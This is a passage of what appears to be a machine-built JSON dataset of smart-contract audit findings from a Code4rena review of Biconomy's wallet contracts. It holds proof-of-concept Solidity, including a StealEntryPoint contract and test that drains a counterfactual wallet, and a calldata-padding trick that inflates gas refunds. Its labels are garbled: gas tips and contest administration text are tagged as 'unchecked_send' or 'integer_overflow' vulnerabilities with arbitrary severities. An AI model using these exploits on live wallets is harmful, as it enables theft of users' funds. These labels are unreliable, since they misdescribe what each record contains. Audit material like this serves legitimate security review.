    "code": "solidity\n36 results - 36 files:\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n  2: pragma solidity >=0.7.5 <0.9.0;\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Enum.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC777TokensRecipient.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC165.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n  4: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  2: pragma solidity 0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-25] Use a more recent version of solidity",
    "description": "In 0.8.15 the conditions necessary for inlining are relaxed. Benchmarks show that the change significantly decreases the bytecode size (which impacts the deployment cost) while the effect on the runtime gas usage is smaller. In 0.8.17 prevent the incorrect removal of storage writes before calls to Yul functions that conditionally terminate the external EVM call; Simplify the starting offset of zero-length operations to zero. More efficient overflow checks for multiplication. 36 results - 36 files: contracts/smart-contract-wallet/BaseSmartAccount.sol: 2: pragma solidity 0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 110,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nSighash   |   Function Signature\n========================\naffed0e0  =>  nonce()\nce03fdab  =>  nonce(uint256)\nb0d691fe  =>  entryPoint()\n13af4035  =>  setOwner(address)\n025b22bc  =>  updateImplementation(address)\n1b71bb6e  =>  updateEntryPoint(address)\nf698da25  =>  domainSeparator()\n3408e470  =>  getChainId()\n3d46b819  =>  getNonce(uint256)\n184b9559  =>  init(address,address,address)\n6d5433e6  =>  max(uint256,uint256)\n405c3941  =>  execTransaction(Transaction,uint256,FeeRefund,bytes)\n1bb09224  =>  handlePayment(uint256,uint256,uint256,uint256,address,address)\na18f51e5  =>  handlePaymentRevert(uint256,uint256,uint256,uint256,address,address)\n934f3a11  =>  checkSignatures(bytes32,bytes,bytes)\n37cf6f29  =>  requiredTxGas(address,uint256,bytes,Enum.Operation)\nc9f909f4  =>  getTransactionHash(address,uint256,bytes,Enum.Operation,uint256,uint256,uint256,uint256,address,address,uint256)\n8d6a6751  =>  encodeTransactionData(Transaction,FeeRefund,uint256)\na9059cbb  =>  transfer(address,uint256)\nac85dca7  =>  pullTokens(address,address,uint256)\nb61d27f6  =>  execute(address,uint256,bytes)\n18dfb3c7  =>  executeBatch(address[],bytes[])\n734cd1e2  =>  _call(address,uint256,bytes)\ne8d655cf  =>  execFromEntryPoint(address,uint256,bytes,Enum.Operation,uint256)\nbe484bf7  =>  _requireFromEntryPointOrOwner()\nba74b602  =>  _validateAndUpdateNonce(UserOperation)\n0f4cd016  =>  _validateSignature(UserOperation,bytes32,address)\nc399ec88  =>  getDeposit()\n4a58db19  =>  addDeposit()\n4d44560d  =>  withdrawDepositTo(address,uint256)\n01ffc9a7  =>  supportsInterface(bytes4)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92 SmartAccount.sol function names can be named and sorted according to METHOD ID Sighash   |   Function Signature ======================== affed0e0  =>  nonce()",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n  30:   solidity: {\n  31:     compilers: [\n  32:       {\n  33:         version: \"0.8.12\",\n  34:         settings: {\n  35:           optimizer: { enabled: true, runs: 200 },\n  36:         },\n  37:       },\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-27] Upgrade Solidity's optimizer",
    "description": "Make sure Solidity\u2019s optimizer is enabled. It reduces gas costs. If you want to gas optimize for contract deployment (costs less to deploy a contract) then set the Solidity optimizer at a low number. If you want to optimize for run-time gas costs (when functions are called on a contract) then set the optimizer to a high number. Set the optimization value higher than 800 in your hardhat.config.ts file. 30:   solidity: { 31:     compilers: [ 32:       {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.209,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "disagree with severity",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Weigh in on severity",
    "description": "Judges have the ultimate discretion in determining severity of issues, as well as whether/how issues are considered duplicates. However, sponsor input is a significant criteria. For a detailed breakdown of severity criteria and how to estimate risk, please refer to [the judging criteria in our documentation](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr). If you disagree with a finding's severity, **leave the severity label intact and add the label** `disagree with severity`, along with a comment indicating your opinion for the judges to review. It is possible for issues to be considered `0 (Non-critical)`. Feel free to use the `question` label for anything you would like additional C4 input on. **Please don't change the severity labels;** that's up to the judge's discretion.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "disagree with severity",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Respond to issues",
    "description": "Label each open/primary High or Medium risk finding as one of these: - `sponsor confirmed`, meaning: \"Yes, this is a problem and we intend to fix it.\" - `sponsor disputed`, meaning either: \"We cannot duplicate this issue\" or \"We disagree that this is an issue at all.\" - `sponsor acknowledged`, meaning: \"Yes, technically the issue is correct, but we are not going to resolve it for xyz reasons.\" (Note: please *don't* use `sponsor disputed` for a finding if you think it should be considered of lower or higher severity. Instead, use the label `disagree with severity` and add comments to recommend a different severity level -- and include your reasoning.)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nThe destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-01] Destruction of the `SmartAccount` implementation](https://github.com/code-423n4/2023-01-biconomy-findings/issues/496)",
    "description": "*Submitted by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/496), also found by [gogo](https://github.com/code-423n4/2023-01-biconomy-findings/issues/491), [gogo](https://github.com/code-423n4/2023-01-biconomy-findings/issues/474), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/443), [smit\\_rajput](https://github.com/code-423n4/2023-01-biconomy-findings/issues/357), [Koolex](https://github.com/code-423n4/2023-01-biconomy-findings/issues/324), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/229), [spacelord47](https://github.com/code-423n4/2023-01-biconomy-findings/issues/201), [0xdeadbeef0x](https://github.com/code-423n4/2023-01-biconomy-findings/issues/174), [Matin](https://github.com/code-423n4/2023-01-biconomy-findings/issues/169), [chaduke](https://github.com/code-423n4/2023-01-biconomy-findings/issues/155), [jonatascm](https://github.com/code-423n4/2023-01-biconomy-findings/issues/98), [ro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/60), [taek](https://github.com/code-423n4/2023-01-biconomy-findings/issues/41), [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/39), and [kankodu](https://github.com/code-423n4/2023-01-biconomy-findings/issues/14)* [contracts/smart-contract-wallet/SmartAccount.sol#L166](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L192](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L229](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229)<br> [contracts/smart-contract-wallet/base/Executor.sol#L23](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.225,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n// Constructor ensures that this implementation contract can not be initialized\nconstructor() public {\n    owner = address(1);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add to the deploy script initialization of the `SmartAccount` implementation, or add to the `SmartAccount` contract the following constructor that will prevent implementation contract from the initialization: // Constructor ensures that this implementation contract can not be initialized constructor() public { owner = address(1); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "gasleft() - startGas",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-02] Theft of funds under relaying the transaction](https://github.com/code-423n4/2023-01-biconomy-findings/issues/489)",
    "description": "*Submitted by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/489), also found by [DevTimSch](https://github.com/code-423n4/2023-01-biconomy-findings/issues/535)* [contracts/smart-contract-wallet/SmartAccount.sol#L200](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L239](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L248](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248) The `execTransaction` function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the `startGas` value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of `21000` gas and the cost per calldata byte of `msg.data.length * 8` gas. At the end of the function, the total consumed gas is calculated as `gasleft() - startGas` and the appropriate refund is sent to the relayer.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n// Basically, just add zero bytes at the end\nabi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[]\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Attack Scenario",
    "description": "Let\u2019s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the `SmartAccount` contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end. So, the original transaction has such calldata: abi.encodeWithSignature(RelayerManager.execute.selector, (...)) The modified (frontrun) transaction calldata: // Basically, just add zero bytes at the end",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.12,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\npragma solidity ^0.8.12;\n\ncontract DummySmartWallet {\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) external {\n        // Do nothing, just test that data with appended zero bytes are accepted by Solidity\n    }\n}\n\ncontract PoC {\n    address immutable smartWallet;\n\n    constructor() {\n        smartWallet = address(new DummySmartWallet());\n    }\n\n    // Successfully call with original data\n    function testWithOriginalData() external {\n        bytes memory txCalldata = _getOriginalTxCalldata();\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    // Successfully call with original data + padded zero bytes\n    function testWithModifiedData() external {\n        bytes memory originalTxCalldata = _getOriginalTxCalldata();\n        bytes memory zeroBytes = new bytes(100000);\n\n        bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    function _getOriginalTxCalldata() internal pure returns(bytes memory) {\n        Transaction memory transaction;\n        FeeRefund memory refundInfo;\n        bytes memory signatures;\n        return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100\\_000 meaningless zeroes bytes, that gives a `100_000 * 4 = 400_000` additional gas refund. Technically, it is possible to pass even more zero bytes. pragma solidity ^0.8.12; contract DummySmartWallet { function execTransaction( Transaction memory _tx,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 48,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n    bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n    bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n    // solhint-disable-next-line no-inline-assembly\n    assembly {\n        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n    }\n    require(address(proxy) != address(0), \"Create2 call failed\");\n    // EOA + Version tracking\n    emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n    BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n    isAccountExist[proxy] = true;\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-03] Attacker can gain control of counterfactual wallet](https://github.com/code-423n4/2023-01-biconomy-findings/issues/460)",
    "description": "*Submitted by [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/460), also found by [0x73696d616f](https://github.com/code-423n4/2023-01-biconomy-findings/issues/536), [giovannidisiena](https://github.com/code-423n4/2023-01-biconomy-findings/issues/522), [Qeew](https://github.com/code-423n4/2023-01-biconomy-findings/issues/518), [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/482), [0x1f8b](https://github.com/code-423n4/2023-01-biconomy-findings/issues/464), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/458), [ey88](https://github.com/code-423n4/2023-01-biconomy-findings/issues/456), [wait](https://github.com/code-423n4/2023-01-biconomy-findings/issues/407), [Haipls](https://github.com/code-423n4/2023-01-biconomy-findings/issues/404), [betweenETHlines](https://github.com/code-423n4/2023-01-biconomy-findings/issues/369), [Lirios](https://github.com/code-423n4/2023-01-biconomy-findings/issues/364), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/331), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/287), [horsefacts](https://github.com/code-423n4/2023-01-biconomy-findings/issues/284), [bin2chen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/278), [ast3ros](https://github.com/code-423n4/2023-01-biconomy-findings/issues/268), [aviggiano](https://github.com/code-423n4/2023-01-biconomy-findings/issues/202), [0xdeadbeef0x](https://github.com/code-423n4/2023-01-biconomy-findings/issues/176), [chaduke](https://github.com/code-423n4/2023-01-biconomy-findings/issues/164), [Jayus](https://github.com/code-423n4/2023-01-biconomy-findings/issues/162), [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/148), [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/143), [zaskoh](https://github.com/code-423n4/2023-01-biconomy-findings/issues/137), [Kalzak](https://github.com/code-423n4/2023-01-biconomy-findings/issues/135), [dragotanqueray](https://github.com/code-423n4/2023-01-biconomy-findings/issues/95), [BClabs](https://github.com/code-423n4/2023-01-biconomy-findings/issues/92), and [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/37)* A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control. However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint: <https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45> function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.763,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n    success = execute(dest, value, func, operation, gasLimit);\n    require(success, \"Userop Failed\");\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Impact",
    "description": "After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function: <https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492> function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) { success = execute(dest, value, func, operation, gasLimit); require(success, \"Userop Failed\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.289,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontract StealEntryPoint {\n    function steal(SmartAccount wallet) public {\n        uint256 balance = address(wallet).balance;\n\n        wallet.execFromEntryPoint(\n            msg.sender, // address dest\n            balance, // uint value\n            \"\", // bytes calldata func\n            Enum.Operation.Call, // Enum.Operation operation\n            gasleft() // uint256 gasLimit\n        );\n    }\n}\n\ncontract AuditTest is Test {\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    uint256 bobPrivateKey = 0x123;\n    uint256 attackerPrivateKey = 0x456;\n\n    address deployer;\n    address bob;\n    address attacker;\n    address entrypoint;\n    address handler;\n\n    SmartAccount public implementation;\n    SmartAccountFactory public factory;\n    MockToken public token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        bob = vm.addr(bobPrivateKey);\n        attacker = vm.addr(attackerPrivateKey);\n        entrypoint = makeAddr(\"entrypoint\");\n        handler = makeAddr(\"handler\");\n\n        vm.label(deployer, \"deployer\");\n        vm.label(bob, \"bob\");\n        vm.label(attacker, \"attacker\");\n\n        vm.startPrank(deployer);\n        implementation = new SmartAccount();\n        factory = new SmartAccountFactory(address(implementation));\n        token = new MockToken();\n        vm.stopPrank();\n    }\n    \n    function test_SmartAccountFactory_StealCounterfactualWallet() public {\n        uint256 index = 0;\n        address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);\n        // Simulate Bob sends 1 ETH to the wallet\n        uint256 amount = 1 ether;\n        vm.deal(counterfactualWallet, amount);\n\n        // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)\n        vm.startPrank(attacker);\n\n        StealEntryPoint stealer = new StealEntryPoint();\n\n        address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);\n        SmartAccount wallet = SmartAccount(payable(proxy));\n\n        // address is the same\n        assertEq(address(wallet), counterfactualWallet);\n\n        // trigger attack\n        stealer.steal(wallet);\n\n        vm.stopPrank();\n\n        // Attacker has stolen the funds\n        assertEq(address(wallet).balance, 0);\n        assertEq(attacker.balance, amount);\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet. contract StealEntryPoint { function steal(SmartAccount wallet) public { uint256 balance = address(wallet).balance; wallet.execFromEntryPoint(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 78,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Proof of Concept",
    "description": "The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction:<br> [contracts/smart-contract-wallet/SmartAccount.sol#L218](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L342](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342) function execTransaction( Transaction memory _tx,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.049,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "validatePaymasterUserOp",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Since `validatePaymasterUserOp` function is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not mapping(bytes32 => boolean) public usedHash function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund) external override returns (bytes memory context, uint256 deadline) { (requiredPreFund);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "FeeRefund.tokenGasPriceFactor",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "[[H-06] `FeeRefund.tokenGasPriceFactor` is not included in signed transaction data allowing the submitter to steal funds](https://github.com/code-423n4/2023-01-biconomy-findings/issues/123)",
